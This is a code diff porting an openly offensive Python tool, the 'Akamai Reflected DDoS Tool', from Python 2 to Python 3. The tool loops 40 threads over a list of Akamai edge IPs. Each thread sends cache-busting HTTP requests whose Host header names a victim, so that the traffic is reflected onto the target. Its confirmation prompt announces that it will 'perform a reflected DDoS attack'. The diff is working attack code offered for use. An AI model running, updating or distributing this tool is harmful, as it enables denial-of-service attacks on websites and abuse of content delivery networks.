@@ -10,7 +10,8 @@ import socket
 import string
 import random
 import hashlib
-import Queue
+import queue
+import base64
 
 c_g = "\033[1;32m"
 c_r = "\033[1;31m"
@@ -22,22 +23,33 @@ akamai_ips 	= []
 base_request 	= ""
 threads = []
 num_threads = 40
-VERSION = "v1.0"
+VERSION = "v1.1"
 
 def banner():
-	print c_g
-	print "IOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlwrilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilZrilZDilZDilojilojilZTilZDilZDilZ0K4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICAK4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICAK4paI4paI4pWRICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgIOKWiOKWiOKVkSAgIArilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVnSAgICVzCg==".decode("base64") % VERSION
-	print c_e
-	print "    Akamai Reflected DDoS Tool\n"
-	print "\tby @program_ninja"
-	print "  https://github.com/m57/ARDT.git"
-	print "_" * 37 + "\n"
+	print(c_g)
+	print("""
+ █████╗ ██████╗ ██████╗ ████████╗
+██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
+███████║██████╔╝██║  ██║   ██║
+██╔══██║██╔══██╗██║  ██║   ██║
+██║  ██║██║  ██║██████╔╝   ██║
+╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝    ╚═╝   %s
+""" % VERSION)
+
+	print(c_e)
+	print("    Akamai Reflected DDoS Tool")
+	print("\tby @program_ninja - https://github.com/m57/ARDT.git")
+	print("")
+	print("    Python 3 port and fixes")
+	print("\tby @dercraig - https://twitter.com/dercraig")
+	print("\t               https://github.com/craig/ARDT.git")
+	print("_____________________________________")
+
 
 
 def usage():
 	banner()
-	print "Usage: %s -l [akamai_list] -t [victim_host] -r [request_file] -n [threads (default: 40)] " % sys.argv[0]
-	print ""
+	print("Usage: %s -l [akamai_list] -t [victim_host] -r [request_file] -n [threads (default: 40)]\n" % sys.argv[0])
 	exit()
 
 def gen_rand_string():
@@ -49,7 +61,7 @@ def gen_rand_string():
 		rand_string += str(random.randint(1,999999))
 		rand_string += charset[random.randint(0,len(charset)-1)]
 	
-	return hashlib.md5(rand_string).hexdigest()
+	return hashlib.md5(rand_string.encode()).hexdigest()
 
 
 class WorkerThread(threading.Thread):
@@ -69,23 +81,23 @@ class WorkerThread(threading.Thread):
 				try:
 					akamai_ip = self.qin.get(timeout=1)
 
-				except Queue.Empty:
+				except queue.Empty:
 
-					print c_y + "[?] " + c_e + "Queue empty, please wait..."
+					print(c_y + "[?] " + c_e + "Queue empty, please wait...")
 				
 				try:
 					r = base_request.replace("%RANDOM%", gen_rand_string())
 					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 					s.settimeout(2)
 					s.connect( (akamai_ip, 80) )
-					s.send(r)
+					s.send(r.encode())
 					ret = s.recv(16).strip()
-					print c_g + "[Thread '%d' ] Packet => '%s:80' => Response '%s'" % (self.tid, akamai_ip, ret) + c_e
+					print(c_g + "[Thread '%d' ] Packet => '%s:80' => Response '%s'" % (self.tid, akamai_ip, ret) + c_e)
 					s.close()
 					self.qin.task_done()
 			
 				except:
-					print c_r + "[!] " + c_e + "Error contacting '%s:80'" % akamai_ip
+					print(c_r + "[!] " + c_e + "Error contacting '%s:80'" % akamai_ip)
 					s.close()
 				
 	
@@ -111,15 +123,15 @@ if __name__ == "__main__":
 		request_file = open(request_f, "r")
 		base_request = request_file.read()
 		if "Host: " not in base_request and not t_check:
-			print c_r + "[!] " + c_e + "'Host: ' field not found in HTTP(s) request file '%s', either set this manually or use '-t www.target.com' in the command line options" % request_f
+			print(c_r + "[!] " + c_e + "'Host: ' field not found in HTTP(s) request file '%s', either set this manually or use '-t www.target.com' in the command line options" % request_f)
 			exit()
 		elif "Host: " in base_request and not t_check:
 			reg = "(Host: .*)"
 			target = re.findall(reg, base_request)[0].split(":")[1].strip()
 
 	except:
-		print c_r + "[!] " + c_e,
-		print "Error opening request file: '%s'." % request_f
+		print(c_r + "[!] " + c_e,)
+		print("Error opening request file: '%s'." % request_f)
 		exit()
 
 	try:
@@ -136,26 +148,26 @@ if __name__ == "__main__":
 			akamai_ips.append(i.strip())
 		
 	except:
-		print c_r + "[!] " + c_e,
-		print "Error opening Akamai list file: '%s'." % akamai_list
+		print(c_r + "[!] " + c_e,)
+		print("Error opening Akamai list file: '%s'." % akamai_list)
 		exit()
 
 
 	start_time = time.time()
 
-	print c_y + "[?] " + c_e + " Target: '%s'" % target 
-	print c_y + "[?] " + c_e + " Request file: '%s'" % request_f 
-	print c_y + "[?] " + c_e + " Akamai EdgeHosts file ('%s' IP's): '%s'" % ( len(akamai_ips), akamai_list)
-	print c_y + "[?] " + c_e + " Threads '%d'\n" % num_threads
+	print(c_y + "[?] " + c_e + " Target: '%s'" % target )
+	print(c_y + "[?] " + c_e + " Request file: '%s'" % request_f )
+	print(c_y + "[?] " + c_e + " Akamai EdgeHosts file ('%s' IP's): '%s'" % ( len(akamai_ips), akamai_list))
+	print(c_y + "[?] " + c_e + " Threads '%d'\n" % num_threads)
  
-	x = raw_input(c_r + "[!] " + c_e + " This is about to perform a reflected DDoS attack with the above settings.\nAre you sure ? [Y/N] ")
+	x = input(c_r + "[!] " + c_e + " This is about to perform a reflected DDoS attack with the above settings.\nAre you sure ? [Y/N] ")
 
 	if not (x[:1] == "y") or (x[:1] == "Y"):
-		print c_r + "[!] " + c_e + " Exiting..."
+		print(c_r + "[!] " + c_e + " Exiting...")
 		exit()
 
 	while True:
-		qin = Queue.Queue()
+		qin = queue.Queue()
 		try:
 			for i in range(0, num_threads):
 				worker = WorkerThread(qin, i)
@@ -169,12 +181,11 @@ if __name__ == "__main__":
 		
 			qin.join()
 	
-			print c_g + "[*] " + c_e + "All Akamai hosts done, re-looping!"
+			print(c_g + "[*] " + c_e + "All Akamai hosts done, re-looping!")
 			time.sleep(1)
 		
 		except KeyboardInterrupt:
-			
-		        print c_r + "[!] " + c_e + "Ctrl+C Caught! Exiting threads..."
+			print(c_r + "[!] " + c_e + "Ctrl+C Caught! Exiting threads...")
 			for t in threads:
 				t.stop()
-		        sys.exit(0)
+				sys.exit(0)
